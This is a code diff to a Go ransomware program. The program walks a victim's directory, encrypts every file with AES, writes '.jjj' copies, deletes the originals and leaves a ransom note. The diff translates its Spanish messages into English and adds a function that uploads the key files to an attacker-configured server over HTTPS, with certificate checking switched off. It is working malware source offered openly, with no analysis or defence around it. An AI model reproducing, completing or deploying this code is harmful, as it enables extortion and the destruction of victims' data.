@@ -4,17 +4,23 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	//"crypto/internal/fips140/edwards25519/field"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/tls"
 	"crypto/x509"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"math/big"
-	"strings"
+	"mime/multipart"
+	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
+	"time"
 )
 
 type EncryptionInfo struct {
@@ -121,7 +127,7 @@ func main() {
 
 	_, err := os.Stat(victim_path)
 	if os.IsNotExist(err) {
-		log.Fatal("Error: La ruta especificada no existe ->", victim_path)
+		log.Fatal("Error: specified route cannot be found. ->", victim_path)
 	}
 
 	err = filepath.Walk(victim_path, walker)
@@ -132,13 +138,25 @@ func main() {
 	fata, _ := json.Marshal(eis)
 	err = os.WriteFile("file.keys", fata, 0666)
 	if err != nil {
-		log.Fatal("Error al escribir file.keys:", err)
+		log.Fatal("Error creating file.keys:", err)
 	} else {
-		fmt.Println("✅ file.keys guardado correctamente.")
+		fmt.Println("✅ file.keys created correctly.")
 	}
 
 	// ✅ Crear archivo de advertencia
 	createWarningFile()
+
+	serverURL := "https://example.com" // Replace with your server URL
+	if serverURL != "" {
+		err:= sendKeys(serverURL, "file.keys", "master.key")
+		if err != nil {
+			log.Println("Error sending keys to server:", err)
+		} else {
+			fmt.Println("✅ Keys sent to server ",serverURL)
+		}
+	} else {
+		fmt.Println("No server URL provided. Skipping key upload.")
+	}
 }
 
 func walker(path string, info os.FileInfo, err error) error {
@@ -154,7 +172,7 @@ func walker(path string, info os.FileInfo, err error) error {
 	
 	bs, err := os.ReadFile(path)
 	if err != nil {
-		log.Println("Error al leer el archivo:", path, err)
+		log.Println("Error reading file:", path, err)
 		return err
 	}
 	
@@ -162,11 +180,11 @@ func walker(path string, info os.FileInfo, err error) error {
 
 	ext := filepath.Ext(path)
 	base := strings.TrimSuffix(path, ext)
-	newPath := base + ".jjj"
+	newPath := base + ".jjj" // Extension can be changed here.
 
 	err = os.WriteFile(newPath, cbs, 0666)
 	if err != nil {
-		log.Println("Error al escribir el archivo encriptado:", newPath, err)
+		log.Println("Error writing encrypted file:", newPath, err)
 		return err
 	}
 
@@ -174,22 +192,75 @@ func walker(path string, info os.FileInfo, err error) error {
 
 	err = os.Remove(path)
 	if err != nil {
-		log.Println("Error al eliminar el archivo original:", path, err)
+		log.Println("Error deleting original file:", path, err)
 		return err
 	}
 	return nil
 }
 
 func createWarningFile() {
-	message := `Tus archivos han sido encriptados.
-Para recuperar tus archivos, necesitas la clave privada correspondiente.
-Guarda este archivo como referencia.
-`
+	message := `Files have been encrypted. If you desire to get them back get in touch with us. C ya!`
 
-	err := os.WriteFile("HELP DECRYPT.txt", []byte(message), 0666)
+	err := os.WriteFile("warning.txt", []byte(message), 0666)
 	if err != nil {
-		log.Fatal("Error al escribir warning.txt:", err)
+		log.Fatal("Error writing warning.txt:", err)
 	} else {
-		fmt.Println("✅ warning.txt guardado correctamente.")
+		fmt.Println("✅ warning.txt saved correctly.")
 	}
+}
+
+func sendKeys(serverURL string, fileKeysPath string, masterKeyPath string) error {
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	files :=map[string]string{
+		"file.keys": fileKeysPath,
+		"master.key": masterKeyPath,
+	}
+
+	for fieldName, filePath := range files {
+		part, err:= writer.CreateFormFile(fieldName, filepath.Base(filePath))
+		if err != nil {
+			return fmt.Errorf("Error creating part for %s: %w", filePath, err)
+		}
+		data, err := os.ReadFile(filePath)
+		if err != nil {
+			return fmt.Errorf("Error reading file %s: %w", filePath, err)
+		}
+		_,err = io.Copy(part, bytes.NewReader(data))
+		if err != nil {
+			return fmt.Errorf("Error copying data to part for %s: %w", filePath, err)
+		}
+	}
+
+	err := writer.Close()
+	if err != nil {
+		return fmt.Errorf("Error closing writer: %w", err)
+	}
+
+
+	// Allow self-sifned certificates
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	req, err := http.NewRequest("POST", serverURL+"/upload", body)
+	if err != nil {
+		return fmt.Errorf("Error creating request: %w", err)
+	}
+
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("Error sending POST request: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("Server returned non-200 status: %d", resp.StatusCode)
+	}
+
+	return nil
 }
